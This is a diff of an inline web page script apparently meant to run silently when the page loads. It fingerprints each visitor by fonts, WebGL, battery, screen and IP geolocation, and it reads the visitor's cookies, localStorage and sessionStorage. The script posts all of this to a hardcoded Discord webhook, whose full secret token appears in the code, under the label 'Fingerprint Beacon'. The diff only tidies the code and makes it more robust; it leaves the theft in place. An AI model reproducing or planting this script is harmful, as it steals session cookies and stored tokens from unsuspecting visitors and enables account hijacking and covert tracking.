@@ -25,20 +25,17 @@
   const webhook = "https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm";
 
   const getFonts = () => {
-    const fonts = [
-      "Arial", "Verdana", "Times New Roman", "Courier", "Comic Sans MS", "Georgia", "Impact", "Monaco", "Tahoma"
-    ];
+    const fonts = ["Arial", "Verdana", "Times New Roman", "Courier", "Comic Sans MS", "Georgia", "Impact", "Monaco", "Tahoma"];
     const canvas = document.createElement("canvas");
     const ctx = canvas.getContext("2d");
-    const defaultWidth = {};
-    const testText = "mmmmmmmmmmlli";
+    const widths = {};
     ctx.font = "72px sans-serif";
-    for (const f of fonts) {
-      ctx.font = `72px '${f}', sans-serif`;
-      const width = ctx.measureText(testText).width;
-      defaultWidth[f] = width;
+    const text = "mmmmmmmmmmlli";
+    for (const font of fonts) {
+      ctx.font = `72px '${font}', sans-serif`;
+      widths[font] = ctx.measureText(text).width;
     }
-    return fonts.filter(f => defaultWidth[f] !== defaultWidth["Arial"]);
+    return fonts.filter(f => widths[f] !== widths["Arial"]);
   };
 
   const getWebGLInfo = () => {
@@ -46,10 +43,10 @@
     const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
     if (!gl) return {};
     const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-    return {
+    return debugInfo ? {
       vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
       renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-    };
+    } : {};
   };
 
   const getBattery = async () => {
@@ -61,42 +58,50 @@
     }
   };
 
-  const geo = await fetch("https://ipinfo.io/json?token=demo")
+  const geo = await fetch("https://geolocation-db.com/json/")
     .then(r => r.json()).catch(() => ({}));
 
   const payload = {
-    ua: navigator.userAgent,
+    userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     screen: `${screen.width}x${screen.height}`,
     touchSupport: navigator.maxTouchPoints,
     cookies: document.cookie || "None",
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage),
+    localStorage: (() => {
+      try {
+        return JSON.stringify(localStorage);
+      } catch {
+        return "Access Denied";
+      }
+    })(),
+    sessionStorage: (() => {
+      try {
+        return JSON.stringify(sessionStorage);
+      } catch {
+        return "Access Denied";
+      }
+    })(),
     fonts: getFonts(),
     webgl: getWebGLInfo(),
     battery: await getBattery(),
-    ip: geo.ip || "N/A",
+    ip: geo.IPv4 || "N/A",
     city: geo.city || "N/A",
-    region: geo.region || "N/A",
-    country: geo.country || "N/A",
-    org: geo.org || "N/A"
+    region: geo.state || "N/A",
+    country: geo.country_name || "N/A"
   };
 
   await fetch(webhook, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      content: `🧲 Fingerprint Beacon:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
+      content: `📡 Fingerprint Beacon:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
     })
   });
 
-  // Optional redirect
+  // Optional redirection
   // window.location.href = "https://google.com";
-})();
-</script>
-
 })();
 </script>
 
